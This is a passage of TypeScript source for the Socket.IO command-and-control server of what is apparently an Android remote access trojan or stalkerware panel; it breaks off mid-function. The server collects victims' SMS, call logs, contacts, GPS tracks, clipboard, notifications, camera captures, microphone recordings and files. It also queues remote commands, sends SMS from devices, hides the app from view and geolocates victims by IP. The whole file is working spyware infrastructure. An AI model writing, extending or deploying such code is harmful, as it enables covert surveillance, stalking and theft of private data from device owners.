import type { Server as HttpServer } from 'http';
import type { Socket } from 'socket.io';
import { Server as SocketIOServer } from 'socket.io';
import type { FastifyInstance } from 'fastify';
import crypto from 'crypto';
import geoip from 'geoip-lite';
import { getDb, dbHelpers } from '../db/index.js';
import { clients, sessions } from '../db/schema.js';
import { eq, sql } from 'drizzle-orm';
import { getConfig } from '../config/index.js';
import { CMD, CMD_TO_DATA_TYPE, type CmdType } from '../types/index.js';
import { getMimeType, normalizePermissions, normalizeDeviceInfo, normalizeCalls, normalizeContacts, normalizeFileList } from '../utils/helpers.js';
import { log } from '../utils/logger.js';

interface TransferChunk {
  transferId: string;
  name: string;
  path?: string;
  channel: string;
  totalChunks: number;
  totalSize: number;
  chunks: Map<number, Buffer>;
  receivedAt: number;
}

class SocketService {
  private io!: SocketIOServer;
  private fastifyApp!: FastifyInstance;
  private sockets: Map<string, Socket> = new Map();
  private gpsTimers: Map<string, NodeJS.Timeout> = new Map();
  private transfers: Map<string, TransferChunk> = new Map();

  initialize(httpServer: HttpServer, fastifyApp: FastifyInstance): void {
    const config = getConfig();
    this.fastifyApp = fastifyApp;

    this.io = new SocketIOServer(httpServer, {
      pingInterval: config.socket.pingInterval,
      pingTimeout: config.socket.pingTimeout,
      maxHttpBufferSize: config.socket.maxHttpBufferSize,
      transports: config.socket.transports as any,
      cors: config.socket.cors as any,
    });

    this.io.use((socket, next) => {
      const isAdmin = socket.handshake.query.admin === 'true';
      if (isAdmin) {
        const token = socket.handshake.auth?.token as string || socket.handshake.query.token as string;
        if (!token) return next(new Error('Admin authentication required'));

        try {
          const payload = this.fastifyApp.jwt.verify(token) as { userId?: number; role?: string; sessionId?: string };
          if (!payload?.userId) return next(new Error('Invalid admin token'));

          if (payload.role !== 'admin') return next(new Error('Admin role required'));

          const d = getDb();
          if (payload.sessionId) {
            const activeSession = d.select({ token: sessions.token }).from(sessions)
              .where(eq(sessions.token, payload.sessionId)).get();
            if (!activeSession) return next(new Error('Admin session expired'));
          } else {
            const activeSession = d.select({ token: sessions.token }).from(sessions)
              .where(eq(sessions.userId, payload.userId)).get();
            if (!activeSession) return next(new Error('Admin session expired'));
          }
        } catch {
          return next(new Error('Invalid admin token'));
        }
        return next();
      }

      const id = socket.handshake.query.id as string;
      if (!id) return next(new Error('Client ID required'));

      const clientToken = socket.handshake.query.token as string || socket.handshake.auth?.token as string;
      const deviceSecret = getConfig().security.deviceSecret;
      if (deviceSecret) {
        const a = Buffer.from(String(clientToken || ''));
        const b = Buffer.from(deviceSecret);
        if (a.length !== b.length || !crypto.timingSafeEqual(a, b)) {
          return next(new Error('Invalid device authentication token'));
        }
      }

      next();
    });

    this.io.on('connection', (socket) => {
      const isAdmin = socket.handshake.query.admin === 'true';
      if (isAdmin) {
        this.handleAdminConnection(socket);
      } else {
        this.handleConnection(socket);
      }
    });

    log.info('Socket.IO server initialized');
  }

  private handleAdminConnection(socket: Socket): void {
    socket.join('admin');
    log.info('Admin frontend connected to Socket.IO');
    socket.on('disconnect', () => { log.info('Admin frontend disconnected from Socket.IO'); });
  }

  private handleConnection(socket: Socket): void {
    const id = socket.handshake.query.id as string;
    const model = socket.handshake.query.model as string || '';
    const manf = socket.handshake.query.manf as string || '';
    const release = socket.handshake.query.release as string || '';

    const xff = socket.handshake.headers['x-forwarded-for'];
    const rawIp = Array.isArray(xff) ? xff[0] : (xff || socket.handshake.address);
    const ip = (typeof rawIp === 'string' ? rawIp.split(',')[0] : String(rawIp)).trim();

    const geo = geoip.lookup(ip);
    const country = geo?.country || null;
    const city = geo?.city || null;
    const timezone = geo?.timezone || null;

    const oldSocket = this.sockets.get(id);
    if (oldSocket && oldSocket !== socket) {
      oldSocket.removeAllListeners('disconnect');
      oldSocket.disconnect(true);
    }

    const d = getDb();
    const existing = d.select().from(clients).where(eq(clients.id, id)).get();

    if (existing) {
      d.update(clients).set({
        ip, country, city, timezone,
        lastSeen: new Date().toISOString(),
        online: true,
        reconnectCount: sql`${clients.reconnectCount} + 1`,
        deviceModel: model, deviceBrand: manf, deviceVersion: release,
      }).where(eq(clients.id, id)).run();
      this.ensureClientData(id);
    } else {
      d.insert(clients).values({
        id, ip, country, city, timezone, online: true,
        deviceModel: model, deviceBrand: manf, deviceVersion: release,
      }).run();
      this.ensureClientData(id);
    }

    this.sockets.set(id, socket);

    dbHelpers.addLog('CONNECTION', 'CLIENT', `Client ${id} connected from ${ip}`, JSON.stringify({ ip, country, city, model, manf }));
    this.io.to('admin').emit('client:connect', { id, model, ip });

    this.runQueuedCommands(id);
    this.restoreGpsPolling(id);
    this.setupHandlers(socket, id);

    socket.on('disconnect', () => this.handleDisconnect(id, socket));
    socket.on('error', (err) => { log.error(`Socket error for ${id}: ${err instanceof Error ? err.message : String(err)}`); });
  }

  private handleDisconnect(id: string, socket: Socket): void {
    if (this.sockets.get(id) !== socket) return;

    const d = getDb();
    d.update(clients).set({ online: false, lastSeen: new Date().toISOString() }).where(eq(clients.id, id)).run();
    this.sockets.delete(id);

    const timer = this.gpsTimers.get(id);
    if (timer) { clearInterval(timer); this.gpsTimers.delete(id); }

    for (const [transferId, transfer] of this.transfers) {
      if (transferId.startsWith(id + ':')) this.transfers.delete(transferId);
    }

    dbHelpers.addLog('DISCONNECTION', 'CLIENT', `Client ${id} disconnected`);
    dbHelpers.setClientData(id, 'notification_status', JSON.stringify(null));
    dbHelpers.setClientData(id, 'mic_status', JSON.stringify(null));
    this.io.to('admin').emit('client:disconnect', { id });
  }

  private ensureClientData(clientId: string): void {
    const dataTypes = ['sms', 'calls', 'contacts', 'wifi', 'clipboard', 'notifications', 'notification_status', 'permissions', 'apps', 'gps', 'files', 'file_error', 'cameras', 'mic_status', 'queue'];
    for (const type of dataTypes) dbHelpers.getOrCreateClientData(clientId, type);
  }

  private saveFileToDb(clientId: string, fileType: string, buffer: Buffer, originalName: string): void {
    dbHelpers.addClientFile(clientId, fileType, originalName, getMimeType(originalName), buffer, buffer.length);
  }

  private completeTransfer(id: string, transfer: TransferChunk, fileType: string, dataType: string): void {
    const buffer = Buffer.concat(Array.from(transfer.chunks.entries()).sort(([a], [b]) => a - b).map(([, chunk]) => chunk));
    this.saveFileToDb(id, fileType, buffer, transfer.name);
    dbHelpers.addLog('DATA', dataType, `${dataType} (chunked) from ${id}`, JSON.stringify({ size: buffer.length, name: transfer.name }));
    this.transfers.delete(`${id}:${transfer.transferId}`);
    this.io.to('admin').emit('client:data', { id, dataType: dataType.toLowerCase() });
  }

  private markCommandResponded(clientId: string, cmdType: CmdType, summary?: string): void {
    const ids = dbHelpers.markAllPendingCommandsResponded(clientId, cmdType, summary);
    for (const id of ids) {
      this.io.to('admin').emit('client:command', { id: clientId, commandId: id, status: 'responded', dataType: CMD_TO_DATA_TYPE[cmdType] });
    }
  }

  private setupHandlers(socket: Socket, id: string): void {
    const d = getDb();

    const broadcastData = (dataType: string) => {
      this.io.to('admin').emit('client:data', { id, dataType });
    };

    socket.on(CMD.SMS, (data: any) => {
      try {
        if (data.smslist) {
          dbHelpers.setClientData(id, 'sms', JSON.stringify(data.smslist));
          dbHelpers.addLog('DATA', 'SMS', `SMS data received from ${id}`, JSON.stringify({ count: data.total || data.smslist.length }));
          this.markCommandResponded(id, CMD.SMS, `${data.total || data.smslist.length} messages`);
          broadcastData('sms');
        }
        if (data.type === 'sent' || (data.action === 'sendSMS' && data.success)) {
          dbHelpers.addLog('COMMAND', 'SMS', `SMS sent from ${id}`);
          this.markCommandResponded(id, CMD.SMS, 'SMS sent');
        }

        if (data.action === 'sendSMS' && data.error) {
          dbHelpers.addLog('ERROR', 'SMS', `SMS send failed from ${id}: ${data.error}`);
          this.markCommandResponded(id, CMD.SMS, `SMS failed: ${data.error}`);
          this.io.to('admin').emit('client:data', { id, dataType: 'sms_status', status: 'error', error: data.error });
        }
      } catch (err: unknown) { log.error(`SMS handler error: ${err instanceof Error ? err.message : String(err)}`); }
    });

    socket.on(CMD.CALLS, (data: any) => {
      try {
        if (data.callsList) {
          const normalized = normalizeCalls(data);
          dbHelpers.setClientData(id, 'calls', JSON.stringify(normalized));
          dbHelpers.addLog('DATA', 'CALLS', `Call logs received from ${id}`, JSON.stringify({ count: data.total || data.callsList.length }));
          this.markCommandResponded(id, CMD.CALLS, `${data.total || data.callsList.length} calls`);
          broadcastData('calls');
        }
      } catch (err: unknown) { log.error(`Calls handler error: ${err instanceof Error ? err.message : String(err)}`); }
    });

    socket.on(CMD.CONTACTS, (data: any) => {
      try {
        if (data.contactsList) {
          const normalized = normalizeContacts(data);
          dbHelpers.setClientData(id, 'contacts', JSON.stringify(normalized));
          dbHelpers.addLog('DATA', 'CONTACTS', `Contacts received from ${id}`, JSON.stringify({ count: data.total || data.contactsList.length }));
          this.markCommandResponded(id, CMD.CONTACTS, `${data.total || data.contactsList.length} contacts`);
          broadcastData('contacts');
        }
      } catch (err: unknown) { log.error(`Contacts handler error: ${err instanceof Error ? err.message : String(err)}`); }
    });

    socket.on(CMD.LOCATION, (data: any) => {
      try {
        if (data.enabled === false || (data.latitude === undefined && data.longitude === undefined)) {
          dbHelpers.addLog('DATA', 'GPS', `GPS unavailable from ${id}: ${data.error || 'No location'}`);
          this.markCommandResponded(id, CMD.LOCATION, data.error || 'No location');
          broadcastData('gps');
          return;
        }

        const lat = Number(data.latitude);
        const lng = Number(data.longitude);
        if (!Number.isFinite(lat) || !Number.isFinite(lng) || lat < -90 || lat > 90 || lng < -180 || lng > 180) {
          dbHelpers.addLog('ERROR', 'GPS', `Invalid GPS data from ${id}: lat=${data.latitude}, lng=${data.longitude}`);
          this.markCommandResponded(id, CMD.LOCATION, 'Invalid location data');
          return;
        }

        const gpsData = JSON.parse(dbHelpers.getOrCreateClientData(id, 'gps'));

        if (gpsData.length > 0) {
          const last = gpsData[gpsData.length - 1];
          const dist = Math.sqrt(Math.pow(lat - last.latitude, 2) + Math.pow(lng - last.longitude, 2)) * 111000;
          const ageMs = Date.now() - new Date(last.time).getTime();
          if (dist < 5 && ageMs < 10000) {
            this.markCommandResponded(id, CMD.LOCATION, `${lat.toFixed(4)}, ${lng.toFixed(4)}`);
            broadcastData('gps');
            return;
          }
        }

        const rawTime = data.timestamp || data.time || Date.now();
        const isoTime = typeof rawTime === 'number' ? new Date(rawTime).toISOString() : String(rawTime);

        const entry: Record<string, unknown> = {
          latitude: lat, longitude: lng, accuracy: data.accuracy,
          speed: data.speed, provider: data.provider, time: isoTime,
        };
        if (data.altitude != null) entry.altitude = data.altitude;
        if (data.bearing != null) entry.bearing = data.bearing;
        if (data.isMock === true) entry.isMock = true;

        gpsData.push(entry);

        const MAX_GPS_ENTRIES = 500;
        if (gpsData.length > MAX_GPS_ENTRIES) {
          gpsData.splice(0, gpsData.length - MAX_GPS_ENTRIES);
        }
        dbHelpers.setClientData(id, 'gps', JSON.stringify(gpsData));

        d.update(clients).set({
          lastSeen: new Date().toISOString(),
        }).where(eq(clients.id, id)).run();

        dbHelpers.addLog('DATA', 'GPS', `GPS location from ${id}`, JSON.stringify({ lat, lng }));
        this.markCommandResponded(id, CMD.LOCATION, `${lat.toFixed(4)}, ${lng.toFixed(4)}`);
        broadcastData('gps');
      } catch (err: unknown) { log.error(`GPS handler error: ${err instanceof Error ? err.message : String(err)}`); }
    });

    socket.on(CMD.WIFI, (data: any) => {
      try {
        if (data.networks) {
          dbHelpers.setClientData(id, 'wifi', JSON.stringify(data.networks));
          dbHelpers.addLog('DATA', 'WIFI', `WiFi data from ${id}`, JSON.stringify({ count: data.total || data.networks.length }));
          this.markCommandResponded(id, CMD.WIFI, `${data.total || data.networks.length} networks`);
          broadcastData('wifi');
        }
        if (data.error) {
          dbHelpers.setClientData(id, 'wifi', JSON.stringify({ error: data.error }));
          this.markCommandResponded(id, CMD.WIFI, data.error);
        }
      } catch (err: unknown) { log.error(`WiFi handler error: ${err instanceof Error ? err.message : String(err)}`); }
    });

    socket.on(CMD.NOTIFICATIONS, (data: any) => {
      try {
        if (data.enabled !== undefined) {
          dbHelpers.setClientData(id, 'notification_status', JSON.stringify({ enabled: data.enabled, connected: !!data.connected }));
          this.markCommandResponded(id, CMD.NOTIFICATIONS, data.enabled ? 'Enabled' : 'Disabled');
          broadcastData('notifications');
        }
        const notification = data.appName ? data : (data.notification || data);
        if ((notification.appName || notification.title) && !data.enabled && !data.removed) {
          const notifications = JSON.parse(dbHelpers.getOrCreateClientData(id, 'notifications'));
          notifications.push({
            appName: notification.appName, title: notification.title,
            content: notification.content, timestamp: notification.timestamp || new Date().toISOString(),
            ongoing: notification.ongoing, clearable: notification.clearable,
            category: notification.category, initial: notification.initial,
          });
          if (notifications.length > 500) notifications.splice(0, notifications.length - 500);
          dbHelpers.setClientData(id, 'notifications', JSON.stringify(notifications));
          dbHelpers.addLog('DATA', 'NOTIFICATIONS', `Notification from ${id}`);
          broadcastData('notifications');
        }
        if (data.removed) {
          dbHelpers.addLog('DATA', 'NOTIFICATIONS', `Notification removed on ${id}: ${data.packageName || 'unknown'}`);
        }
      } catch (err: unknown) { log.error(`Notifications handler error: ${err instanceof Error ? err.message : String(err)}`); }
    });

    socket.on(CMD.CLIPBOARD, (data: any) => {
      try {
        const clipboard = JSON.parse(dbHelpers.getOrCreateClientData(id, 'clipboard'));
        clipboard.push({ text: data.text, length: data.length, label: data.label, mimeType: data.mimeType, timestamp: data.timestamp || new Date().toISOString() });
        if (clipboard.length > 200) clipboard.splice(0, clipboard.length - 200);
        dbHelpers.setClientData(id, 'clipboard', JSON.stringify(clipboard));
        dbHelpers.addLog('DATA', 'CLIPBOARD', `Clipboard data from ${id}`);
        this.markCommandResponded(id, CMD.CLIPBOARD, 'Clipboard updated');
        broadcastData('clipboard');
      } catch (err: unknown) { log.error(`Clipboard handler error: ${err instanceof Error ? err.message : String(err)}`); }
    });

    socket.on(CMD.APPS, (data: any) => {
      try {
        if (data.apps) {
          dbHelpers.setClientData(id, 'apps', JSON.stringify(data.apps));
          dbHelpers.addLog('DATA', 'APPS', `Apps list from ${id}`, JSON.stringify({ count: data.total || data.apps.length }));
          this.markCommandResponded(id, CMD.APPS, `${data.total || data.apps.length} apps`);
          broadcastData('apps');
        }
      } catch (err: unknown) { log.error(`Apps handler error: ${err instanceof Error ? err.message : String(err)}`); }
    });

    socket.on(CMD.PERMISSIONS, (data: any) => {
      try {
        const perms = normalizePermissions(data);
        dbHelpers.setClientData(id, 'permissions', JSON.stringify(perms));
        dbHelpers.addLog('DATA', 'PERMISSIONS', `Permissions from ${id}`, JSON.stringify({ count: perms.length }));
        this.markCommandResponded(id, CMD.PERMISSIONS, `${perms.length} permissions`);
        broadcastData('permissions');
      } catch (err: unknown) { log.error(`Permissions handler error: ${err instanceof Error ? err.message : String(err)}`); }
    });

    socket.on(CMD.PERM_CHECK, (data: any) => {
      try {
        const perms = JSON.parse(dbHelpers.getOrCreateClientData(id, 'permissions'));
        const idx = perms.findIndex((p: any) => p.permission === data.permission);
        if (idx >= 0) perms[idx].allowed = data.allowed;
        else perms.push({ permission: data.permission, allowed: data.allowed });
        dbHelpers.setClientData(id, 'permissions', JSON.stringify(perms));
        this.markCommandResponded(id, CMD.PERM_CHECK, `${data.permission}: ${data.allowed ? 'granted' : 'denied'}`);
      } catch (err: unknown) { log.error(`Permission check handler error: ${err instanceof Error ? err.message : String(err)}`); }
    });

    socket.on(CMD.INFO, (data: Record<string, unknown>) => {
      try {
        const normalized = normalizeDeviceInfo(data);
        const updates: Record<string, unknown> = { deviceInfo: JSON.stringify(normalized) };
        if (data.model || data.brand) {
          updates.deviceModel = data.model as string;
          updates.deviceBrand = data.brand as string;
          updates.deviceVersion = (data.androidVersion || data.version) as string;
        }
        d.update(clients).set(updates).where(eq(clients.id, id)).run();
        dbHelpers.addLog('DATA', 'DEVICE', `Device info from ${id}`);
        this.markCommandResponded(id, CMD.INFO, 'Device info updated');
        this.io.to('admin').emit('client:update', { id, dataType: 'info' });
      } catch (err: unknown) { log.error(`Device info handler error: ${err instanceof Error ? err.message : String(err)}`); }
    });

    socket.on(CMD.FASON, (data: any) => {
      try {
        const hidden = !!data.hidden;
        d.update(clients).set({ fasonHidden: hidden }).where(eq(clients.id, id)).run();
        dbHelpers.addLog('DATA', 'FASON', `App ${hidden ? 'hidden' : 'shown'} on ${id}`);
        this.markCommandResponded(id, CMD.FASON, hidden ? 'Hidden' : 'Shown');
        this.io.to('admin').emit('client:update', { id, dataType: 'fason' });
      } catch (err: unknown) { log.error(`Fason Manager handler error: ${err instanceof Error ? err.message : String(err)}`); }
    });

    socket.on(CMD.CAMERA, (data: any) => {
      try {
        if (data.camList) {
          d.update(clients).set({ cameraPermission: !!data.hasPermission }).where(eq(clients.id, id)).run();
          dbHelpers.setClientData(id, 'cameras', JSON.stringify(data.list || []));
          dbHelpers.addLog('DATA', 'CAMERA', `Camera list from ${id}`, JSON.stringify({ count: data.list?.length }));
          this.markCommandResponded(id, CMD.CAMERA, `${data.list?.length || 0} cameras`);
          broadcastData('camera');
        } else if (data.type === 'download_start') {
          this.transfers.set(`${id}:${data.transferId}`, {
            transferId: data.transferId, name: data.name || `capture_${Date.now()}.jpg`,
            channel: CMD.CAMERA, totalChunks: data.totalChunks, totalSize: data.totalSize,
            chunks: new Map(), receivedAt: Date.now(),
          });
          this.io.to('admin').emit('client:transfer', { id, transferId: data.transferId, name: data.name, totalChunks: data.totalChunks, totalSize: data.totalSize, progress: 0 });
        } else if (data.type === 'download_chunk') {
          const transferId = `${id}:${data.transferId}`;
          const transfer = this.transfers.get(transferId);
          if (transfer) {
            transfer.chunks.set(data.chunkIndex, Buffer.from(data.chunkData, 'base64'));
            const progress = Math.round((transfer.chunks.size / transfer.totalChunks) * 100);
            this.io.to('admin').emit('client:transfer', { id, transferId: data.transferId, name: transfer.name, totalChunks: transfer.totalChunks, totalSize: transfer.totalSize, progress });
            if (transfer.chunks.size === transfer.totalChunks) {
              const isVideo = transfer.name && transfer.name.endsWith('.mp4');
              this.completeTransfer(id, transfer, isVideo ? 'video' : 'photo', 'CAMERA');
              this.markCommandResponded(id, CMD.CAMERA, isVideo ? 'Video recorded' : 'Photo captured');
            }
          }
        } else if (data.type === 'download_end') {
          this.transfers.delete(`${id}:${data.transferId}`);
          if (data.error) {
            dbHelpers.addLog('ERROR', 'CAMERA', `Camera transfer failed from ${id}: ${data.error}`);
            this.markCommandResponded(id, CMD.CAMERA, `Transfer failed: ${data.error}`);
          }
        } else if (data.status === 'recording') {
          dbHelpers.addLog('DATA', 'CAMERA', `Video recording started from ${id}`, JSON.stringify({ cameraId: data.cameraId }));
          this.io.to('admin').emit('client:data', { id, dataType: 'camera', videoStatus: 'recording', cameraId: data.cameraId });
        } else if (data.status === 'stopped') {
          dbHelpers.addLog('DATA', 'CAMERA', `Video recording stopped from ${id}`);
          this.io.to('admin').emit('client:data', { id, dataType: 'camera', videoStatus: 'stopped' });
        } else if (data.image === false && data.error) {
          dbHelpers.addLog('ERROR', 'CAMERA', `Camera error from ${id}: ${data.error}`);
          this.markCommandResponded(id, CMD.CAMERA, data.error);
        } else if (typeof data.buffer === 'string' && data.buffer.length > 0) {
          const buffer = Buffer.from(data.buffer, 'base64');
          const fileName = data.name || `capture_${Date.now()}.jpg`;
          const isVideo = fileName.endsWith('.mp4');
          this.saveFileToDb(id, isVideo ? 'video' : 'photo', buffer, fileName);
          dbHelpers.addLog('DATA', 'CAMERA', `${isVideo ? 'Video' : 'Photo'} captured from ${id}`, JSON.stringify({ size: buffer.length }));
          this.markCommandResponded(id, CMD.CAMERA, isVideo ? 'Video captured' : 'Photo captured');
          broadcastData('camera');
        }
      } catch (err: unknown) { log.error(`Camera handler error: ${err instanceof Error ? err.message : String(err)}`); }
    });

    socket.on(CMD.FILES, (data: any) => {
      try {
        if (data.type === 'list') {
          const normalizedList = normalizeFileList(data.list || []);
          dbHelpers.setClientData(id, 'files', JSON.stringify(normalizedList));
          d.update(clients).set({ currentPath: data.path || '' }).where(eq(clients.id, id)).run();
          dbHelpers.setClientData(id, 'file_error', JSON.stringify(null));
          dbHelpers.addLog('DATA', 'FILES', `File list from ${id}`, JSON.stringify({ path: data.path, count: normalizedList.length }));
          this.markCommandResponded(id, CMD.FILES, `${normalizedList.length} files`);
          broadcastData('files');
        } else if (data.type === 'download') {
          if (typeof data.buffer !== 'string' || data.buffer.length === 0) return;
          const buffer = Buffer.from(data.buffer, 'base64');
          this.saveFileToDb(id, 'download', buffer, data.name || 'download');
          dbHelpers.addLog('DATA', 'FILES', `File downloaded from ${id}: ${data.name}`, JSON.stringify({ size: buffer.length }));
          this.markCommandResponded(id, CMD.FILES, `Downloaded: ${data.name}`);
          broadcastData('files');
        } else if (data.type === 'download_start') {
          this.transfers.set(`${id}:${data.transferId}`, {
            transferId: data.transferId, name: data.name, path: data.path,
            channel: CMD.FILES, totalChunks: data.totalChunks, totalSize: data.totalSize,
            chunks: new Map(), receivedAt: Date.now(),
          });
          this.io.to('admin').emit('client:transfer', { id, transferId: data.transferId, name: data.name, totalChunks: data.totalChunks, totalSize: data.totalSize, progress: 0 });
        } else if (data.type === 'download_chunk') {
          const transferId = `${id}:${data.transferId}`;
          const transfer = this.transfers.get(transferId);
          if (transfer) {
            transfer.chunks.set(data.chunkIndex, Buffer.from(data.chunkData, 'base64'));
            const progress = Math.round((transfer.chunks.size / transfer.totalChunks) * 100);
            this.io.to('admin').emit('client:transfer', { id, transferId: data.transferId, name: transfer.name, totalChunks: transfer.totalChunks, totalSize: transfer.totalSize, progress });
            if (transfer.chunks.size === transfer.totalChunks) {
              this.completeTransfer(id, transfer, 'download', 'FILES');
              this.markCommandResponded(id, CMD.FILES, `Downloaded: ${transfer.name}`);
            }
          }
        } else if (data.type === 'download_end') {
          this.transfers.delete(`${id}:${data.transferId}`);
          if (data.error) {
            dbHelpers.addLog('ERROR', 'FILES', `File transfer failed from ${id}: ${data.error}`);
            this.markCommandResponded(id, CMD.FILES, `Transfer failed: ${data.error}`);
          }
        } else if (data.type === 'error') {
          const transferId = data.transferId ? `${id}:${data.transferId}` : null;
          if (transferId) this.transfers.delete(transferId);
          const errorMsg = data.error || 'Unknown file transfer error';
          dbHelpers.addLog('ERROR', 'FILES', `File transfer error from ${id}: ${errorMsg}`, JSON.stringify({ path: data.path || '' }));
          dbHelpers.setClientData(id, 'file_error', JSON.stringify({ error: errorMsg, path: data.path || '', timestamp: Date.now() }));
          this.markCommandResponded(id, CMD.FILES, errorMsg);
          this.io.to('admin').emit('client:data', { id, dataType: 'files' });
        } else if (data.type === 'modify_result') {
          const success = data.success !== false;
          const summary = success
            ? `${data.action || 'modify'}: ${data.path || ''}`
            : `${data.action || 'modify'} failed: ${data.error || 'unknown'}`;
          this.markCommandResponded(id, CMD.FILES, summary);
          if (!success) {
            dbHelpers.addLog('ERROR', 'FILES', `File modify failed from ${id}: ${data.error}`, JSON.stringify({ action: data.action, path: data.path }));
          }
        } else if (data.type === 'push_result') {
          const success = data.success !== false;
          const summary = success ? `Pushed: ${data.path || ''}` : `Push failed: ${data.error || 'unknown'}`;
          this.markCommandResponded(id, CMD.FILES, summary);
        } else if (data.type === 'upload_start' || data.type === 'upload_progress') {
          this.io.to('admin').emit('client:transfer', { id, transferId: data.transferId, name: data.name, totalSize: data.totalSize, progress: data.progress || 0 });
        } else if (data.type === 'upload_end') {
          this.markCommandResponded(id, CMD.FILES, `Uploaded: ${data.name || 'file'}`);
        }
      } catch (err: unknown) { log.error(`Files handler error: ${err instanceof Error ? err.message : String(err)}`); }
    });

    socket.on(CMD.MIC, (data: any) => {
      try {
        if (data.type === 'download_start') {
          this.transfers.set(`${id}:${data.transferId}`, {
            transferId: data.transferId, name: data.name || `recording_${Date.now()}.mp4`,
            channel: CMD.MIC, totalChunks: data.totalChunks, totalSize: data.totalSize,
            chunks: new Map(), receivedAt: Date.now(),
          });
          this.io.to('admin').emit('client:transfer', { id, transferId: data.transferId, name: data.name, totalChunks: data.totalChunks, totalSize: data.totalSize, progress: 0 });
        } else if (data.type === 'download_chunk') {
          const transferId = `${id}:${data.transferId}`;
          const transfer = this.transfers.get(transferId);
          if (transfer) {
            transfer.chunks.set(data.chunkIndex, Buffer.from(data.chunkData, 'base64'));
            const progress = Math.round((transfer.chunks.size / transfer.totalChunks) * 100);
            this.io.to('admin').emit('client:transfer', { id, transferId: data.transferId, name: transfer.name, totalChunks: transfer.totalChunks, totalSize: transfer.totalSize, progress });
            if (transfer.chunks.size === transfer.totalChunks) {
              this.completeTransfer(id, transfer, 'recording', 'MIC');
              this.markCommandResponded(id, CMD.MIC, 'Recording complete');
            }
          }
        } else if (data.type === 'download_end') {
          this.transfers.delete(`${id}:${data.transferId}`);
          if (data.error) {
            dbHelpers.addLog('ERROR', 'MIC', `Mic transfer failed from ${id}: ${data.error}`);
            this.markCommandResponded(id, CMD.MIC, `Transfer failed: ${data.error}`);
          }
        } else if (data.file) {
          if (typeof data.buffer !== 'string' || data.buffer.length === 0) return;
          const buffer = Buffer.from(data.buffer, 'base64');
          this.saveFileToDb(id, 'recording', buffer, data.name || `recording_${Date.now()}.mp4`);
          dbHelpers.addLog('DATA', 'MIC', `Recording from ${id}`, JSON.stringify({ size: buffer.length, name: data.name }));
          this.markCommandResponded(id, CMD.MIC, 'Recording received');
          broadcastData('mic');
        } else if (data.status) {
          dbHelpers.addLog('DATA', 'MIC', `Mic status from ${id}: ${data.status}`, JSON.stringify({ duration: data.duration }));
          this.markCommandResponded(id, CMD.MIC, data.status);
          this.io.to('admin').emit('client:data', { id, dataType: 'mic_status', status: data.status, duration: data.duration });
        } else if (data.error) {
          dbHelpers.addLog('ERROR', 'MIC', `Mic error from ${id}: ${data.message || data.error}`);
          this.markCommandResponded(id, CMD.MIC, data.message || data.error);
          this.io.to('admin').emit('client:data', { id, dataType: 'mic_status', status: 'error', error: data.message || data.error });
        }
      } catch (err: unknown) { log.error(`Mic handler error: ${err instanceof Error ? err.message : String(err)}`); }
    });
  }

  send(clientId: string, cmd: CmdType, params: Record<string, unknown> = {}): { sent: boolean; commandId: string } {
    const commandId = crypto.randomUUID();
    const socket = this.sockets.get(clientId);

    dbHelpers.createCommand(commandId, clientId, cmd, JSON.stringify(params));

    if (socket) {
      socket.emit('order', { type: cmd, ...params, cmdId: commandId, timestamp: Date.now() });
      dbHelpers.updateCommandStatus(commandId, 'delivered');
      this.io.to('admin').emit('client:command', { id: clientId, commandId, status: 'delivered', dataType: CMD_TO_DATA_TYPE[cmd] });
      dbHelpers.addLog('COMMAND', 'SOCKET', `Command ${cmd} sent to ${clientId}`, JSON.stringify({ commandId, ...params }));
      return { sent: true, commandId };
    } else {
      this.queueCommand(clientId, cmd, params, commandId);
      dbHelpers.addLog('COMMAND', 'QUEUE', `Command ${cmd} queued for ${clientId}`, JSON.stringify({ commandId, ...params }));
      return { sent: false, commandId };
    }
  }

  private queueCommand(clientId: string, cmd: CmdType, params: Record<string, unknown>, commandId?: string): void {
    const queue = JSON.parse(dbHelpers.getOrCreateClientData(clientId, 'queue'));

    queue.push({ type: cmd, ...params, cmdId: commandId || crypto.randomUUID(), timestamp: Date.now() });
    dbHelpers.setClientData(clientId, 'queue', JSON.stringify(queue));
  }

  private runQueuedCommands(clientId: string): void {
    const queue = JSON.parse(dbHelpers.getOrCreateClientData(clientId, 'queue'));
    if (queue.length === 0) return;
    const socket = this.sockets.get(clientId);
    if (!socket) return;
    for (const cmd of queue) {
      const { cmdId, type, timestamp, ...params } = cmd;
      socket.emit('order', { type, ...params, cmdId, timestamp });
      if (cmdId) dbHelpers.updateCommandStatus(cmdId, 'delivered');
    }
    dbHelpers.setClientData(clientId, 'queue', JSON.stringify([]));
    dbHelpers.addLog('COMMAND', 'QUEUE', `Ran ${queue.length} queued commands for ${clientId}`);
  }

  setGps(clientId: string, interval: number): void {
    const d = getDb();
    const existing = d.select({ id: clients.id }).from(clients).where(eq(clients.id, clientId)).get();
    if (!existing) {
      log.warn(`setGps: Client ${clientId} not found in database, skipping`);
      return;
    }
    const oldTimer = this.gpsTimers.get(clientId);
    if (oldTimer) { clearInterval(oldTimer); this.gpsTimers.delete(clientId); }
    d.update(clients).set({ gpsInterval: interval }).where(eq(clients.id, clientId)).run();
    if (interval > 0) {
      if (this.sockets.has(clientId)) {
        this.send(clientId, CMD.LOCATION);
      }
      const timer = setInterval(() => {
        if (this.sockets.has(clientId)) {
          this.send(clientId, CMD.LOCATION);
        }
      }, interval * 1000);
      this.gpsTimers.set(clientId, timer);
    }
  }

  private restoreGpsPolling(clientId: string): void {
    const d = getDb();
    const client = d.select({ gpsInterval: clients.gpsInterval }).from(clients).where(eq(clients.id, clientId)).get();
    if (client && client.gpsInterval != null && client.gpsInterval > 0) this.setGps(clientId, client.gpsInterval);
  }

  getOnlineCount(): number { return this.sockets.size; }
  isClientConnected(clientId: string): boolean { return this.sockets.has(clientId); }
  getIO(): SocketIOServer { return this.io; }
  broadcast(event: string, data: any): void { this.io.to('admin').emit(event, data); }

  cleanupStaleTransfers(): void {
    const now = Date.now();
    for (const [transferId, transfer] of this.transfers) {
      if (now - transfer.receivedAt > 10 * 60 * 1000) this.transfers.delete(transferId);
    }
  }

  cleanupStaleClients(): number {
    const d = getDb();
    const cutoff = new Date(Date.now() - 30 * 24 * 60 * 60 * 1000).toISOString();
    const result = d.delete(clients).where(sql`${clients.online} = 0 AND ${clients.lastSeen} < ${cutoff}`).run();
    return result.changes;
  }

  disconnectClient(clientId: string): void {
    const socket = this.sockets.get(clientId);
    if (socket) {
      socket.removeAllListeners('disconnect');
      socket.disconnect(true);
    }
    this.sockets.delete(clientId);

    const d = getDb();
    d.update(clients).set({ online: false, lastSeen: new Date().toISOString() }).where(eq(clients.id, clientId)).run();

    const timer = this.gpsTimers.get(clientId);
